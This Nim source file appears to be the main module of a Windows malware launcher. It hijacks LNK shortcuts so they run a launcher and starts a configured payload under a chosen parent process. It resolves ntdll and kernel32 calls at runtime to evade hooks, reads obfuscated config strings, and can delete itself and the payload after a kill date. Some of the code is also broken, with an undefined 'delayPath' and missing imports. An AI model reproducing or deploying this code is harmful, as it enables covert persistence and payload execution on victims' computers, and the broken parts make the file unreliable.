import tables
import core/config
import core/static_strs
import nimvoke/dinvoke

from core/processes import startProc
from strutils import parseInt, toLower, strip
from os import removeFile, joinPath, fileExists
from core/util import getFullPath, convertSeconds, getFullPath
from core/lnks import restoreOrigLnkPaths, modifyAllLnkPaths
from winim/lean import NTSTATUS, BOOLEAN, LARGE_INTEGER, WINBOOL, LPCSTR, NULL, FALSE, HANDLE, ERROR_ALREADY_EXISTS,
                       LPSECURITY_ATTRIBUTES, GetLastError, CloseHandle

when defined suicide:
  import suicide

let CONFIG: Table[string, string] = getConfig()

let 
  launcherPath: string = CONFIG[jam("launcherPath")]
  launcherBin: string = CONFIG[jam("launcherBin")]
  payloadPath: string = CONFIG[jam("payloadPath")]
  payloadBin: string = CONFIG[jam("payloadBin")]
  parentProc: string = CONFIG[jam("parentProc")]
  resetTimer: string = CONFIG[jam("resetTimer")]
  mutexName: string = CONFIG[jam("mutexName")]
  fLauncherPath: string = getFullPath(launcherPath)
  fPayloadPath: string = getFullPath(payloadPath)
  
var
  hMutex: HANDLE
  status: NTSTATUS 
  alertable: BOOLEAN = 0 
  liResetDelay: LARGE_INTEGER 
  resetDelay: int64 = resetTimer.parseInt()

dinvokeDefine(
  NtDelayExecution,
  "ntdll.dll",
  proc (Alertable: BOOLEAN, DelayInterval: ptr LARGE_INTEGER): NTSTATUS {.stdcall.}
)

dinvokeDefine(
  CreateMutexA, 
  "kernel32.dll",
  proc (lpMutexAttributes: LPSECURITY_ATTRIBUTES,
        bInitialOwner: WINBOOL,
        lpName: LPCSTR): HANDLE {.stdcall.}
)

proc checkMtx(): bool = 
  hMutex = CreateMutexA(NULL, FALSE, mutexName.cstring)
  if GetLastError() == ERROR_ALREADY_EXISTS:
    return false 
  return true 

when isMainModule:
  liResetDelay.QuadPart = -convertSeconds(resetDelay)

  if not checkMtx():
    restoreOrigLnkPaths()
    status = NtDelayExecution(alertable, addr(liResetDelay))
    modifyAllLnkPaths(fLauncherPath, launcherBin)
    CloseHandle(hMutex)
    quit(QuitSuccess)

  #[ If the date is at or over the kill date, clean up and exit ]#
  when defined suicide:
    let 
      killDate: string = CONFIG[jam("killDate")]
      datefmt: string = jam("yyyy-MM-dd")
      
    let currentDate = getTime().format(datefmt)
    if currentDate >= killDate:
      let pl = joinPath(fPayloadPath, payloadBin)
      if fileExists(delayPath):
        removeFile(delayPath)
      restoreOrigLnkPaths()
      removeFile(pl)
      suicide.sDelete()

  restoreOrigLnkPaths()
  startProc(fPayloadPath, payloadBin, parentProc)
  status = NtDelayExecution(alertable, addr(liResetDelay))
  modifyAllLnkPaths(fLauncherPath, launcherBin)
  CloseHandle(hMutex)
  quit(QuitSuccess)



